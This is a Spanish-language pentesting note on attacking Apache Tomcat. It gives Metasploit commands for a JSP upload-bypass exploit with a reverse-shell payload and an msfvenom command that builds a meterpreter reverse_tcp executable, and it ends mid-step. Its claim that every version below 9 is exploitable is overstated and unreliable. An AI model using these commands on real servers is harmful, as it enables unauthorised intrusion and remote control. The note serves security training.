# Apache Tomcat

Apache Tomcat es un contenedor de servlets Java. Está diseñado específicamente desarrollar y alojar sitios web dinámicos y ejecutar aplicaciones Java basadas en las especificaciones Servlet y JSP. Se ejecuta de forma predeterminada en el puerto 8080 sobre tcp.

La principal diferencia con **Apache HTTP web server** es que este aloja webs hechas principalmente en PHP y tomcat en Java.

### Explotación

**Apache Tomcat** es vulnerable a la ejecución remota de código en cualquier versión inferior a la 9 y podría permitir a un atacante cargar y ejecutar un payload JSP para obtener acceso remoto al servidor.

**Crear una shell remota**

```bash
msf > use exploit/multi/http/tomcat_jsp_upload_bypass
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf exploit(multi/http/tomcat_jsp_upload_bypass) > set rhosts <IP>
msf exploit(multi/http/tomcat_jsp_upload_bypass) > set payload java/jsp_shell_reverse_tcp
msf exploit(multi/http/tomcat_jsp_upload_bypass) > set shell <cmd/bashf>
```

Hay que tener en cuenta que Tomcat puede correr bajo Windows y Linux, por lo que puede ser necesario configurar las opciones `target` y `payload`.

> Nota: este módulo puede necesitar varios intentos para funcionar.

**Creando una sesión meterpreter**

Primero creamos el payload con `msfvenom:`

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> LPORT=<puerto> -f exe -o meterpreter.exe
```

Ahora necesitamos transferir el payload al servidor. Puesto que en principio no contamos con una forma de transferir archivos, podemos crear un servidor web en nuestra máquina kali

[⟵ Anterior](../05_sistema.md#explotación-windows)
